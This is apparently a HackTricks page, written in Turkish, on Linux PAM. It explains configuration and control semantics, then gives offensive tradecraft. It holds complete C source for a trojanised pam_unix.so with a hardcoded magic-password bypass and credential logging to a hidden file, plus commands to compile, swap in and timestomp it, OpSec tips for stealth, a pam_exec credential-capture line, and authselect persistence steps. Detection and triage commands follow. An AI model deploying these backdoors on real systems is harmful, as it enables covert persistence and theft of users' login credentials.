# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Temel Bilgiler

**PAM (Pluggable Authentication Modules)**, **bilgisayar hizmetlerine erişmeye çalışan kullanıcıların kimliğini doğrulayan** ve erişimlerini çeşitli kriterlere göre kontrol eden bir güvenlik mekanizması olarak çalışır. Yalnızca yetkili kullanıcıların belirli hizmetlerle etkileşime girmesini sağlarken, sistemin aşırı yüklenmesini önlemek için kullanımlarını potansiyel olarak sınırlayan dijital bir güvenlik görevlisine benzer.

#### Yapılandırma Dosyaları

- **Solaris ve UNIX tabanlı sistemler** genellikle `/etc/pam.conf` konumunda bulunan merkezi bir yapılandırma dosyası kullanır.
- **Linux sistemleri** ise dizin yaklaşımını tercih eder ve hizmete özel yapılandırmaları `/etc/pam.d` içinde saklar. Örneğin, login hizmetinin yapılandırma dosyası `/etc/pam.d/login` konumunda bulunur.

login hizmeti için bir PAM yapılandırması şu şekilde görünebilir:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Bu realm'ler veya management grupları, her biri authentication ve session management sürecinin farklı yönlerinden sorumlu olan **auth**, **account**, **password** ve **session** bileşenlerini içerir:

- **Auth**: Kullanıcı kimliğini doğrular; genellikle bir password ister.
- **Account**: Account doğrulamasını gerçekleştirir; group membership veya günün saatine bağlı kısıtlamalar gibi koşulları kontrol eder.
- **Password**: Complexity kontrolleri veya dictionary attacks prevention dahil olmak üzere password güncellemelerini yönetir.
- **Session**: Directory'leri mount etmek veya resource limit'leri ayarlamak gibi bir service session'ının başlangıcında ya da sonunda gerçekleştirilen işlemleri yönetir.

#### **PAM Module Controls**

Controls, module'ün success veya failure durumundaki yanıtını belirleyerek genel authentication sürecini etkiler. Bunlar şunlardır:

- **Required**: Required bir module'ün failure durumu, ancak sonraki tüm module'ler kontrol edildikten sonra eventual failure ile sonuçlanır.
- **Requisite**: Failure durumunda sürecin hemen sonlandırılmasını sağlar.
- **Sufficient**: Success durumu, sonraki bir module failure vermediği sürece aynı realm'deki kontrollerin geri kalanını bypass eder.
- **Optional**: Yalnızca stack'teki tek module olması durumunda failure'a neden olur.

#### Offensive Semantics That Matter

PAM backdooring sırasında **eklenen rule'un konumu**, çoğu zaman payload'un kendisinden daha önemlidir:

- `include` ve `substack`, diğer file'lardaki rule'ları içeri aktarır; bu nedenle `sshd`'yi düzenlemek yalnızca SSH'yi etkilerken `system-auth`, `common-auth` veya başka bir shared stack'i düzenlemek aynı anda birden fazla service'i etkiler.
- PAM, `[success=1 default=ignore]` gibi bracketed control'leri de destekler. Bunlar, `pam_unix.so`'yu görünür biçimde replace etmek yerine başarılı bir custom check sonrasında bir veya daha fazla module'ü **skip etmek** için abuse edilebilir.
- `module-path` **absolute** (`/usr/lib/security/pam_custom.so`) olabilir veya default PAM module directory'sine **relative** olabilir. Modern Linux system'lerinde gerçek directory'ler genellikle `/lib/security`, `/lib64/security`, `/usr/lib/security` veya `/usr/lib/x86_64-linux-gnu/security` gibi multiarch path'lerdir.

Quick operator takeaway: patch uygulamadan önce her zaman **full service graph**'ı map edin. Örneğin bazı distro'larda `sshd -> password-auth -> system-auth`, bazılarında ise `sshd -> system-remote-login -> system-login -> system-auth` bulunması, aynı one-line implant'ın amaçlanandan çok daha geniş bir alana yayılabileceği anlamına gelir.

#### Example Scenario

Birden fazla auth module'ünün bulunduğu bir setup'ta süreç katı bir sırayı izler. `pam_securetty` module'ü login terminal'ının unauthorized olduğunu tespit ederse root login'leri blocklanır; ancak "required" status'ü nedeniyle tüm module'ler yine de işlenir. `pam_env`, environment variable'ları set ederek user experience'a potansiyel olarak katkıda bulunur. `pam_ldap` ve `pam_unix` module'leri user'ı authenticate etmek için birlikte çalışır; `pam_unix`, daha önce sağlanmış bir password'u kullanmayı deneyerek authentication method'larında efficiency ve flexibility sağlar.


## Backdooring PAM – Hooking `pam_unix.so`

High-value Linux environment'larında kullanılan classic bir persistence trick, legitimate PAM library'sini trojanised bir drop-in ile **swap etmektir**. Her SSH / console login sonunda `pam_unix.so:pam_sm_authenticate()` çağrıldığı için birkaç satır C, credential'ları capture etmek veya *magic* password bypass implement etmek için yeterlidir.

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Derleyin ve gizlice değiştirin:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec İpuçları
1. **Atomic overwrite** – yarım yazılmış ve SSH erişimini kilitleyebilecek kütüphaneleri önlemek için geçici bir dosyaya yazın ve `mv` ile hedef konuma taşıyın.
2. `/usr/bin/.dbus.log` gibi log dosyası konumları, meşru masaüstü artefact'larıyla uyum sağlar.
3. PAM hatalı davranışlarını önlemek için symbol export'larını (`pam_sm_setcred` vb.) aynı tutun.

### Detection
* `pam_unix.so` dosyasının MD5/SHA256 değerini distro paketiyle karşılaştırın.
* Değiştirilmiş kütüphaneleri manuel hashing yapmadan tespit etmek için `rpm -V pam` veya `debsums -s libpam-modules` kullanın.
* `/lib/security/` altında herkes tarafından yazılabilir veya alışılmadık sahiplik değerlerini kontrol edin.
* `auditd` kuralı: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Beklenmeyen modüller için PAM config'lerini grep'leyin: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Quick triage commands (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Persistence için `pam_exec` Abuse

`pam_unix.so` dosyasını değiştirmek yerine, normal stack'i korurken her SSH girişinde bir implant başlatmak için `/etc/pam.d/sshd` dosyasına bir `pam_exec` satırı eklemek daha hafif bir yaklaşımdır:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec`, `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` ve `PAM_TYPE` gibi PAM metadata bilgilerini environment variables içinde alır. `expose_authtok` ile helper, `auth` veya `password` aşamalarında password bilgisini `stdin` üzerinden de okuyabilir. Helper'ın real UID yerine effective UID ile çalışmasını istiyorsanız `seteuid` ekleyin.

Pratik notlar:

- `session optional pam_exec.so ...`, socket'leri yeniden açmak veya detached daemon başlatmak gibi **post-login actions** için daha uygundur.
- `auth optional pam_exec.so quiet expose_authtok ...`, session açılmadan önce çalıştığı için genellikle **credential capture** amacıyla tercih edilir.
- `type=session` veya `type=auth`, çalıştırmayı belirli bir PAM aşamasıyla sınırlandırmak ve gürültülü çift çalışmayı önlemek için kullanılabilir.

### Distro tooling'den kalıcı olma: `authselect`

RHEL, CentOS Stream, Fedora ve türevi sistemlerde `/etc/pam.d/system-auth` veya `/etc/pam.d/password-auth` gibi generated file'larda doğrudan yapılan değişiklikler **`authselect` tarafından üzerine yazılabilir**. Kalıcılık için operatörler genellikle aktif custom profile'ı `/etc/authselect/custom/<profile>/` altında patch'ler ve ardından yeniden seçer veya uygular.

Root erişiminiz olduğunda tipik iş akışı:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Bu, hem offense hem de triage açısından önemlidir: `/etc/pam.d/system-auth` dosyası `Generated by authselect` ve `Do not modify this file manually` banner'larını içeriyorsa gerçek persistence noktası `/etc/pam.d/` yerine `/etc/authselect/custom/` altında bulunabilir.

### Gerçek ortamda gözlemlenen güncel tradecraft

Plague **Linux backdoor**'u hakkında 2025'te yayımlanan raporlar, aynı temel fikrin daha ileri bir biçimde kullanıldığını gösterdi: **static bypass password** içeren malicious bir PAM component'ı; ayrıca login sonrasında session izlerini azaltmak için SSH ile ilgili environment variable'ların ve shell history'nin (`HISTFILE=/dev/null`) temizlenmesi. Bu, backdoor logic'i PAM içinde bulunurken stealth artifact'larının yalnızca **authentication** başarıyla tamamlandıktan **sonra** ortaya çıkabilmesi nedeniyle kullanışlı bir hunting pattern'dir.


## References

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
